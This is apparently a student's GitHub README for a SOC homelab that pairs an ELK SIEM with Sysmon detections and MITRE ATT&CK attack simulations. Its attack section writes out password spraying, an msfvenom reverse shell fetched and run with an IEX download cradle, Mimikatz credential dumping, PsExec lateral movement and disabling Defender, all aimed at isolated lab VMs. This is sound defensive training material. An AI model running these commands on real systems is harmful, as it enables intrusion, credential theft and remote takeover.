<div align="center">

# 🛡️ Enterprise SOC Homelab

### Full-Stack Security Operations Center — Built from Scratch

[![Active Directory](https://img.shields.io/badge/Active_Directory-Windows_Server_2022-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Nourmohamed2)
[![Elastic Stack](https://img.shields.io/badge/Elastic_Stack-8.x-005571?style=for-the-badge&logo=elastic&logoColor=white)](https://github.com/Nourmohamed2)
[![Kali Linux](https://img.shields.io/badge/Kali_Linux-2024-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)](https://github.com/Nourmohamed2)
[![VMware](https://img.shields.io/badge/VMware_Workstation-Pro_17-607078?style=for-the-badge&logo=vmware&logoColor=white)](https://github.com/Nourmohamed2)
[![MITRE ATT&CK](https://img.shields.io/badge/MITRE_ATT%26CK-8_Techniques-E31837?style=for-the-badge)](https://github.com/Nourmohamed2)

**Built by [Nour Mohamed Mahmoud Hassan](https://www.linkedin.com/in/nour-mohamed-788418260)**
Final-Year Cybersecurity Student · AASTMT · Class of 2026

[LinkedIn](https://www.linkedin.com/in/nour-mohamed-788418260) · [GitHub](https://github.com/Nourmohamed2)

</div>

---

## 📋 Table of Contents

- [Project Overview](#-project-overview)
- [Lab Architecture](#-lab-architecture)
- [Technologies Used](#-technologies-used)
- [Lab Setup — Phase by Phase](#-lab-setup--phase-by-phase)
  - [Phase 0 — Pre-Lab Planning](#phase-0--pre-lab-planning)
  - [Phase 1 — VMware & Networking](#phase-1--vmware--networking)
  - [Phase 2 — Active Directory](#phase-2--windows-server-2022--active-directory)
  - [Phase 3 — Sysmon](#phase-3--sysmon-installation--configuration)
  - [Phase 4 — Windows Client](#phase-4--windows-client--domain-join)
  - [Phase 5 — ELK Stack SIEM](#phase-5--elastic-stack-siem)
  - [Phase 6 — Detection Engineering](#phase-6--kibana-dashboards--detection-engineering)
  - [Phase 7 — Attack Simulations](#phase-7--attack-simulations-mitre-attck)
  - [Phase 8 — Threat Hunting & DFIR](#phase-8--threat-hunting--dfir)
- [MITRE ATT&CK Coverage](#-mitre-attck-coverage)
- [Key Detections](#-key-detections)
- [Skills Demonstrated](#-skills-demonstrated)
- [Repository Structure](#-repository-structure)
- [Issues & Lessons Learned](#-issues--lessons-learned)

---

## 🔍 Project Overview

This project is a **fully operational, enterprise-grade Security Operations Center (SOC) simulation** built entirely on VMware Workstation using five virtual machines. The lab replicates the core infrastructure of a real corporate environment — complete with Active Directory, centralized SIEM log collection, adversary simulation, and custom detection engineering.

The goal is to demonstrate end-to-end SOC analyst competencies:

- 🏗️ **Infrastructure** — Deploy and configure enterprise Windows/Linux environments
- 📡 **Log Engineering** — Build a complete Sysmon → Winlogbeat → Logstash → Elasticsearch → Kibana pipeline
- ⚔️ **Adversary Simulation** — Execute real-world attack techniques mapped to MITRE ATT&CK
- 🔎 **Detection Engineering** — Build custom Kibana rules that fire on every simulated attack
- 🕵️ **Threat Hunting** — Proactively hunt using KQL with a structured hypothesis-driven methodology
- 📝 **DFIR** — Build incident timelines, identify IOCs, and document findings professionally

> **Detection Rate: 7/8 MITRE ATT&CK techniques detected** using custom Kibana rules and KQL queries.

---

## 🏗️ Lab Architecture

```
                    VMware Workstation Host (Physical PC)
                                    │
       ┌────────────┬───────────────┼───────────────┬────────────┐
       │            │               │               │            │
  WIN-DC01    WIN-CLIENT1    UBUNTU-SIEM      UBUNTU-SRV   KALI-ATTACK
  DC/AD/DNS   Workstation    ELK Stack        Web/Wazuh    Red Team
  .10.10       .10.20          .10.30           .10.40       .10.50
       │            │               │               │            │
       └────────────┴───────────────┴───────────────┴────────────┘
                         VMnet2 — 192.168.10.0/24
                         Host-Only (Isolated Lab Network)
```

### Data Flow

```
WIN-DC01 ──[Sysmon+Winlogbeat]──► Logstash:5044 ──► Elasticsearch:9200 ──► Kibana:5601
WIN-CLIENT1 ──[Sysmon+Winlogbeat]──►      (same pipeline)
KALI-ATTACK ──[Attacks]──────────► WIN-DC01 / WIN-CLIENT1 / UBUNTU-SRV
SOC Analyst ──[Browser]──────────► http://192.168.10.30:5601 (Kibana Dashboard)
```

### VM Specifications

| VM | Role | OS | IP | RAM | Disk |
|---|---|---|---|---|---|
| WIN-DC01 | Domain Controller / AD / DNS | Windows Server 2022 | 192.168.10.10 | 4 GB | 80 GB |
| WIN-CLIENT1 | Domain-Joined Workstation | Windows 10/11 Pro | 192.168.10.20 | 4 GB | 60 GB |
| UBUNTU-SIEM | ELK Stack SIEM | Ubuntu 22.04 LTS | 192.168.10.30 | 6 GB | 100 GB |
| UBUNTU-SRV | Linux Target / Wazuh | Ubuntu 22.04 LTS | 192.168.10.40 | 2 GB | 40 GB |
| KALI-ATTACK | Red Team / Attacker | Kali Linux 2024 | 192.168.10.50 | 2 GB | 40 GB |

---

## 🧰 Technologies Used

| Category | Tools & Technologies |
|---|---|
| **Virtualization** | VMware Workstation Pro 17 |
| **Operating Systems** | Windows Server 2022, Windows 10/11 Pro, Ubuntu 22.04 LTS, Kali Linux 2024 |
| **Identity & Access** | Active Directory Domain Services, DNS, Group Policy (GPO) |
| **SIEM** | Elasticsearch 8.x, Kibana 8.x, Logstash 8.x |
| **Log Shippers** | Winlogbeat 8.x, Sysmon (SwiftOnSecurity config) |
| **Detection Language** | KQL (Kibana Query Language) |
| **Attack Tools** | Metasploit Framework, msfvenom, Hydra, CrackMapExec, impacket-psexec, Mimikatz (Kiwi) |
| **Scripting** | PowerShell, Bash |
| **Frameworks** | MITRE ATT&CK |

---

## 📖 Lab Setup — Phase by Phase

### Phase 0 — Pre-Lab Planning

Before touching VMware, the full architecture was designed:

- **Network Topology** — All VMs on isolated `VMnet2 (192.168.10.0/24)` — no internet access for lab VMs
- **IP Plan** — Static IPs assigned manually to each VM (no DHCP)
- **Log Flow Design** — Sysmon → Winlogbeat → Logstash (5044) → Elasticsearch (9200) → Kibana (5601)
- **BIOS Verification** — Intel VT-x / AMD SVM enabled before VMware installation

```powershell
# Verify hardware virtualization is enabled
Get-ComputerInfo -Property HyperVRequirementVirtualizationFirmwareEnabled
# Expected: True
```

---

### Phase 1 — VMware & Networking

**VMnet2 Configuration** (Virtual Network Editor):

| Setting | Value |
|---|---|
| Network Type | Host-only |
| Subnet IP | 192.168.10.0 |
| Subnet Mask | 255.255.255.0 |
| DHCP | **DISABLED** (static IPs only) |

> ⚠️ Host-only networking was chosen intentionally so attack traffic is completely sandboxed and cannot reach the real internet.

---

### Phase 2 — Windows Server 2022 & Active Directory

**Domain:** `SOCLAB.LOCAL` | **NetBIOS:** `SOCLAB`

```powershell
# Set static IP on WIN-DC01
New-NetIPAddress -InterfaceAlias 'Ethernet0' -IPAddress 192.168.10.10 -PrefixLength 24 -DefaultGateway 192.168.10.1
Set-DnsClientServerAddress -InterfaceAlias 'Ethernet0' -ServerAddresses 192.168.10.10

# Promote to Domain Controller
Install-ADDSForest `
    -DomainName 'SOCLAB.LOCAL' `
    -DomainNetbiosName 'SOCLAB' `
    -InstallDns:$true `
    -SafeModeAdministratorPassword (ConvertTo-SecureString 'SOCLab@2024!' -AsPlainText -Force) `
    -Force:$true
```

**OU Structure created:**

```
SOCLAB.LOCAL
└── SOCLAB_CORP
    ├── IT_Department        → jsmith, mchen, Nmohamed
    ├── Finance_Department   → sconnor
    ├── HR_Department
    ├── Servers
    ├── Workstations
    └── Service_Accounts     → svc_backup
```

**Domain Users:**

| Username | Full Name | Groups |
|---|---|---|
| jsmith | John Smith | IT_Admins, SOC_Analysts, Domain Admins |
| mchen | Mike Chen | IT_Admins |
| sconnor | Sarah Connor | Finance_Users |
| Nmohamed | Nour Mohamed | IT_Admins, Domain Admins |
| svc_backup | Service Account | — |

**Audit Policy configured via `auditpol`:**

```powershell
auditpol /set /subcategory:"Credential Validation"     /success:enable /failure:enable
auditpol /set /subcategory:"Logon"                     /success:enable /failure:enable
auditpol /set /subcategory:"Process Creation"          /success:enable
auditpol /set /subcategory:"Sensitive Privilege Use"   /success:enable /failure:enable
auditpol /set /subcategory:"Security Group Management" /success:enable
```

---

### Phase 3 — Sysmon Installation & Configuration

Sysmon was installed on **both WIN-DC01 and WIN-CLIENT1** using the industry-standard [SwiftOnSecurity config](https://github.com/SwiftOnSecurity/sysmon-config).

```powershell
# Download SwiftOnSecurity config
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml' `
    -OutFile 'C:\Tools\Sysmon\sysmonconfig.xml'

# Install Sysmon
cd C:\Tools\Sysmon
.\Sysmon64.exe -accepteula -i sysmonconfig.xml

# Verify
Get-Service -Name Sysmon64  # Status: Running
```

**Key Sysmon Event IDs used in detection:**

| Event ID | Name | Detection Use |
|---|---|---|
| 1 | Process Create | Full command line + parent-child chain |
| 3 | Network Connection | C2 beacons, reverse shells |
| 10 | Process Access | LSASS credential dumping |
| 11 | File Created | Malware dropper artifacts |
| 13 | Registry Value Set | Run key persistence |
| 17/18 | Pipe Created/Connected | PsExec lateral movement |
| 22 | DNS Query | C2 domain lookups |

---

### Phase 4 — Windows Client & Domain Join

```powershell
# Set static IP and DNS (must point to DC for domain join)
New-NetIPAddress -InterfaceAlias 'Ethernet0' -IPAddress 192.168.10.20 -PrefixLength 24 -DefaultGateway 192.168.10.1
Set-DnsClientServerAddress -InterfaceAlias 'Ethernet0' -ServerAddresses 192.168.10.10

# Verify DNS resolves domain
Resolve-DnsName -Name SOCLAB.LOCAL  # Must return 192.168.10.10

# Join domain
Add-Computer -DomainName 'SOCLAB.LOCAL' -Credential SOCLAB\Administrator -Restart
```

> Sysmon was installed on WIN-CLIENT1 immediately after domain join — same steps as Phase 3.

---

### Phase 5 — Elastic Stack SIEM

**UBUNTU-SIEM:** Ubuntu 22.04 LTS Server, 6 GB RAM, 4 CPUs, IP `192.168.10.30`

#### Elasticsearch

```bash
# Add Elastic 8.x repository
wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | \
    sudo gpg --dearmor -o /usr/share/keyrings/elasticsearch-keyring.gpg

echo 'deb [signed-by=/usr/share/keyrings/elasticsearch-keyring.gpg] \
    https://artifacts.elastic.co/packages/8.x/apt stable main' | \
    sudo tee /etc/apt/sources.list.d/elastic-8.x.list

sudo apt update && sudo apt install elasticsearch -y
```

**Key `elasticsearch.yml` settings:**

```yaml
cluster.name: soc-homelab
node.name: siem-node-01
network.host: 0.0.0.0
http.port: 9200
discovery.type: single-node
xpack.security.enabled: true
```

**JVM heap** (`/etc/elasticsearch/jvm.options.d/heap.options`):

```
-Xms3g
-Xmx3g
```
> Rule: heap = 50% of VM RAM. Never exceed 31 GB.

#### Kibana

```bash
sudo apt install kibana -y

# kibana.yml key settings:
# server.port: 5601
# server.host: '0.0.0.0'
# elasticsearch.hosts: ['https://localhost:9200']

sudo systemctl enable kibana && sudo systemctl start kibana
# Access: http://192.168.10.30:5601
```

#### Logstash Pipeline

Full pipeline config: [`Configurations/logstash-winlogbeat.conf`](Configurations/logstash-winlogbeat.conf)

```ruby
input {
  beats { port => 5044  host => '0.0.0.0' }
}
filter {
  if [winlog][channel] == 'Security' {
    mutate { add_tag => ['windows_security'] }
  }
  if [winlog][channel] == 'Microsoft-Windows-Sysmon/Operational' {
    mutate { add_tag => ['sysmon'] }
  }
  if [winlog][event_id] == 4625 {
    mutate { add_tag => ['failed_logon', 'brute_force_candidate'] }
  }
}
output {
  elasticsearch {
    hosts    => ['https://192.168.10.30:9200']
    user     => 'elastic'
    password => 'YOUR_PASSWORD'
    ssl_certificate_verification => false
    index    => 'winlogbeat-%{+YYYY.MM.dd}'
  }
}
```

#### Winlogbeat (on Windows VMs)

Full config: [`Configurations/winlogbeat.yml`](Configurations/winlogbeat.yml)

```yaml
winlogbeat.event_logs:
  - name: Security
  - name: System
  - name: Application
  - name: Microsoft-Windows-Sysmon/Operational
  - name: Microsoft-Windows-PowerShell/Operational

output.logstash:
  hosts: ['192.168.10.30:5044']
```

```powershell
# Install and start as Windows service
.\install-service-winlogbeat.ps1
Start-Service winlogbeat
Get-Service winlogbeat  # Status: Running
```

---

### Phase 6 — Kibana Dashboards & Detection Engineering

**Kibana Data View:** `winlogbeat-*` | Timestamp: `@timestamp`

#### Master KQL Query Reference

```kql
# Failed logon attempts (brute force indicator)
winlog.event_id: 4625

# Failed logons from specific IP
winlog.event_id: 4625 AND winlog.event_data.IpAddress: 192.168.10.50

# Suspicious PowerShell (IEX / DownloadString / EncodedCommand)
winlog.event_id: 1 AND winlog.event_data.CommandLine: (*IEX* OR *DownloadString* OR *EncodedCommand*)

# Outbound to port 4444 (Meterpreter C2)
winlog.event_id: 3 AND winlog.event_data.DestinationPort: 4444

# LSASS memory access — credential dumping
winlog.event_id: 10 AND winlog.event_data.TargetImage: *lsass.exe

# SeDebugPrivilege used — Mimikatz signature
winlog.event_id: 4673 AND winlog.event_data.PrivilegeList: *SeDebugPrivilege*

# PsExec PSEXESVC service installed
winlog.event_id: 7045 AND winlog.event_data.ServiceName: PSEXESVC

# Registry Run key persistence
winlog.event_id: 13 AND winlog.event_data.TargetObject: (*\CurrentVersion\Run*)
```

#### Custom Detection Rules Created

| Rule Name | Type | Severity | MITRE |
|---|---|---|---|
| Suspicious LSASS Memory Access | Custom Query | Critical | T1003.001 |
| SMB Password Spraying | Threshold (≥10/min) | High | T1110.003 |
| PsExec Lateral Movement | Custom Query | Critical | T1021.002 |
| PowerShell Suspicious Execution | Custom Query | High | T1059.001 |

All exported rule JSONs: [`Detection-Rules/`](Detection-Rules/)

---

### Phase 7 — Attack Simulations (MITRE ATT&CK)

> ⚠️ All attacks were conducted **inside the isolated lab network only**. No real systems were targeted.

#### Scenario 2 — Password Spraying (T1110.003)

**Tool:** Hydra | **Target:** WIN-DC01 SMB (port 445)

```bash
# On KALI-ATTACK
hydra -L /tmp/users.txt -P /tmp/passwords.txt smb://192.168.10.10 -t 4 -V
```

**Detection:** Spike of `Event ID 4625` from `192.168.10.50` → Threshold rule fires at >10 failures/minute.

---

#### Scenario 3 — PowerShell Reverse Shell (T1059.001 / T1571)

**Tool:** Metasploit msfvenom

```bash
# Step 1: Generate payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.50 LPORT=4444 -f psh-reflection -o /tmp/payload.ps1

# Step 2: Serve payload via HTTP
cd /tmp && python3 -m http.server 8080

# Step 3: Start listener
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.10.50; set LPORT 4444; exploit -j"
```

```powershell
# Execute on WIN-CLIENT1 (payload delivery simulation)
IEX (New-Object Net.WebClient).DownloadString('http://192.168.10.50:8080/payload.ps1')
```

**Detection:** `Sysmon Event 1` (IEX in CommandLine) + `Sysmon Event 3` (outbound to port 4444)

---

#### Scenario 4 — Credential Dumping (T1003.001)

**Tool:** Mimikatz via Meterpreter Kiwi extension

```bash
# From active Meterpreter session
meterpreter > getsystem           # Escalate to NT AUTHORITY\SYSTEM
meterpreter > migrate <PID>       # Migrate to explorer.exe (x64)
meterpreter > load kiwi           # Load Mimikatz
meterpreter > creds_all           # Dump credentials from LSASS memory
```

**Expected output:**
```
wdigest credentials
Username   Domain   Password
jsmith     SOCLAB   Welcome@1234
Nmohamed   SOCLAB   Welcome@1234
```

**Detection:** `Sysmon Event 10` (non-system process accessed `lsass.exe`) + `Event 4673` (SeDebugPrivilege used)

---

#### Scenario 5 — Lateral Movement via PsExec (T1021.002)

**Tool:** CrackMapExec + impacket-psexec | **Credentials:** Obtained from Mimikatz dump

```bash
# Step 1: Validate credentials across network
crackmapexec smb 192.168.10.0/24 -u Nmohamed -p 'Welcome@1234'
# Output: [+] SOCLAB.LOCAL\Nmohamed:Welcome@1234 (Pwn3d!)

# Step 2: Execute commands on Domain Controller
crackmapexec smb 192.168.10.10 -u Nmohamed -p 'Welcome@1234' -x 'whoami'

# Step 3: Get interactive SYSTEM shell on DC
impacket-psexec SOCLAB.LOCAL/Nmohamed:'Welcome@1234'@192.168.10.10
# C:\Windows\system32> whoami → nt authority\system
```

**Detection:** `Event 7045` (PSEXESVC service created on DC) + `Event 4624 Type 3` (network logon from `.10.50`)

---

### Phase 8 — Threat Hunting & DFIR

#### Threat Hunting Methodology

```
1. Hypothesis  → Define TTP to hunt (based on MITRE ATT&CK)
2. Data        → Select log sources + time range in Kibana
3. Investigate → Query with KQL, compare to baseline
4. Triage      → Confirm true positive, pivot on IOCs
5. Correlate   → Link events across Sysmon + Security + PowerShell logs
6. Document    → Write hunt report: IOCs, timeline, findings
7. Respond     → Contain: disable accounts, isolate VM
8. Detect      → Create Kibana rule to automate future detection
```

Full hunt reports: [`Threat-Hunt-Reports/`](Threat-Hunt-Reports/)

#### Hunt 1 — Brute Force

```kql
# Find source IP with most failed logons
winlog.event_id: 4625 AND winlog.event_data.IpAddress: 192.168.10.50

# Did any of those failures eventually succeed?
winlog.event_id: 4624 AND winlog.event_data.TargetUserName: Nmohamed AND winlog.event_data.IpAddress: 192.168.10.50
```

**Result:** 20+ Event 4625 in <60 seconds → Brute force **confirmed** ✅

#### Hunt 2 — Credential Dumping

```kql
# Find non-system process accessing LSASS
winlog.event_id: 10 AND winlog.event_data.TargetImage: *lsass.exe
    AND NOT winlog.event_data.SourceImage: (*\Windows\system32\svchost.exe OR *MsMpEng.exe OR *wininit.exe)

# Confirm Mimikatz GrantedAccess flag
# 0x1010 / 0x1410 = Mimikatz-style read access to LSASS memory
```

**Result:** Non-system process with GrantedAccess `0x1410` → Mimikatz dump **confirmed** ✅

---

## 🗺️ MITRE ATT&CK Coverage

| ATT&CK ID | Technique | Tool Used | Detected? |
|---|---|---|---|
| T1046 | Network Service Discovery | Nmap | ⚠️ Needs Zeek (network-based) |
| T1110.003 | Password Spraying | Hydra | ✅ Event 4625 threshold |
| T1059.001 | PowerShell Execution | msfvenom + IEX | ✅ Sysmon Event 1 |
| T1571 | Non-Standard Port | Meterpreter port 4444 | ✅ Sysmon Event 3 |
| T1003.001 | LSASS Memory Dump | Mimikatz Kiwi | ✅ Sysmon Event 10 |
| T1021.002 | SMB/Admin Shares | CrackMapExec + PsExec | ✅ Event 7045 (PSEXESVC) |
| T1078 | Valid Accounts | Stolen credentials | ✅ Event 4624 Type 3 anomaly |
| T1547.001 | Registry Run Keys | `reg add` | ✅ Sysmon Event 13 |

**Detection Rate: 7/8 (87.5%)**

---

## 🔔 Key Detections

### Windows Security Event IDs

| Event ID | Description | Why It Matters |
|---|---|---|
| 4624 | Successful logon | Track Type 3 (network) logons for lateral movement |
| 4625 | Failed logon | Brute force — threshold >10/min from same IP |
| 4648 | Explicit credential logon | Pass-the-hash / credential misuse |
| 4673 | Sensitive privilege used | SeDebugPrivilege = Mimikatz running |
| 4698 | Scheduled task created | Persistence technique |
| 4720 | User account created | Backdoor account detection |
| 4740 | Account locked out | Brute force side effect |
| 7045 | New service installed | PsExec PSEXESVC, malware persistence |

### Sysmon Event IDs

| Event ID | Name | Key Use |
|---|---|---|
| 1 | Process Create | Every process with full command line + hashes |
| 3 | Network Connection | Outbound C2 connections |
| 10 | Process Access | LSASS memory read = credential dumping |
| 13 | Registry Value Set | Run key persistence modifications |
| 22 | DNS Query | C2 domain lookups |

---

## 🎯 Skills Demonstrated

```
┌─────────────────────────────────────────────────────────────────┐
│  Infrastructure      │  VMware, Virtual Networking, Snapshots   │
│  Active Directory    │  AD DS, GPO, OU Design, User Management  │
│  Windows Admin       │  PowerShell, Server 2022, auditpol       │
│  Linux Admin         │  Ubuntu CLI, Netplan, systemctl, APT     │
│  SIEM Engineering    │  ELK Stack 8.x, Logstash, Winlogbeat     │
│  Log Analysis        │  Windows Event IDs, Sysmon IDs, KQL      │
│  Offensive Security  │  Metasploit, Hydra, CME, impacket        │
│  Detection Eng.      │  Custom Kibana rules, MITRE mapping       │
│  Threat Hunting      │  Hypothesis-driven, KQL pivot analysis   │
│  DFIR                │  Timeline analysis, IOC identification    │
└─────────────────────────────────────────────────────────────────┘
```

---

## 📁 Repository Structure

```
SOC-Homelab/
│
├── README.md                          ← You are here
│
├── Configurations/
│   ├── winlogbeat.yml                 ← Winlogbeat config for Windows VMs
│   ├── logstash-winlogbeat.conf       ← Logstash pipeline (input/filter/output)
│   ├── elasticsearch.yml              ← Elasticsearch cluster config
│   └── sysmonconfig.xml               ← SwiftOnSecurity Sysmon config
│
├── Detection-Rules/
│   ├── lsass-access-rule.json         ← Kibana rule: T1003.001 LSASS
│   ├── brute-force-threshold.json     ← Kibana rule: T1110.003 brute force
│   └── psexec-lateral-movement.json   ← Kibana rule: T1021.002 PsExec
│
├── Threat-Hunt-Reports/
│   ├── Hunt-001-BruteForce.md         ← Full investigation report
│   ├── Hunt-002-CredentialDumping.md  ← Full investigation report
│   └── Hunt-003-LateralMovement.md    ← Full investigation report
│
├── Attack-Scenarios/
│   └── MITRE-ATT&CK-Coverage.md      ← All 8 TTPs — simulated vs detected
│
├── Report/
│   └── SOC_Homelab_Report_NourMohamed.docx  ← Full implementation report
│
└── Screenshots/
    ├── 01-lab-topology.png
    ├── 02-kibana-dashboard.png
    ├── 03-sysmon-event1-powershell.png
    ├── 04-sysmon-event10-lsass.png
    ├── 05-mimikatz-creds-dump.png
    ├── 06-psexec-service-7045.png
    ├── 07-brute-force-4625-spike.png
    └── 08-detection-rules-fired.png
```

---

## 🪲 Issues & Lessons Learned

| Issue | Root Cause | Resolution |
|---|---|---|
| `Install-WindowsFeature` not recognized | Wrong PowerShell context | Used Server Manager GUI instead |
| Audit GPO showing "No Auditing" | GPO not linked to Domain Controllers OU | Applied `auditpol` commands directly on DC |
| Payload blocked by Windows Defender | Defender detected msfvenom signature | Disabled Defender in lab: `Set-MpPreference -DisableRealtimeMonitoring $true` |
| PowerShell hangs after `IEX` | Reverse shell holds the connection — normal | Worked from Kali Meterpreter session |
| Nmap not visible in Kibana | Nmap is network-based; Winlogbeat reads Windows Event Logs only | Expected — needs Zeek/Suricata for network detection |
| Domain join: "Network path not found" | DNS pointing to wrong server | Set DNS to `192.168.10.10`, confirmed with `Resolve-DnsName SOCLAB.LOCAL` |
| Elasticsearch won't start | JVM heap too large | Fixed `jvm.options`: `-Xms3g -Xmx3g` |

---

## 📬 Contact

<div align="center">

**Nour Mohamed Mahmoud Hassan**
Final-Year Cybersecurity Student — AASTMT · Class of 2026

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/nour-mohamed-788418260)
[![GitHub](https://img.shields.io/badge/GitHub-Follow-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Nourmohamed2)

</div>

---

<div align="center">

*Built for learning. Tested with real tools. Documented like a professional.*

⭐ If this project helped you — give it a star!

</div>
